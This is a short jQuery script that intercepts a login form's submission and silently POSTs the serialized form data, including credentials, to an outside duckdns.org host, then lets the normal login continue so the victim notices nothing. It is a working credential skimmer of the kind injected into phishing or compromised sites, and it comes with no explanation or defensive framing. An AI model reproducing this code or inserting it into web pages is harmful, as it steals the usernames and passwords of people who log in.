$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://curl-aldiganz2022.duckdns.org",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
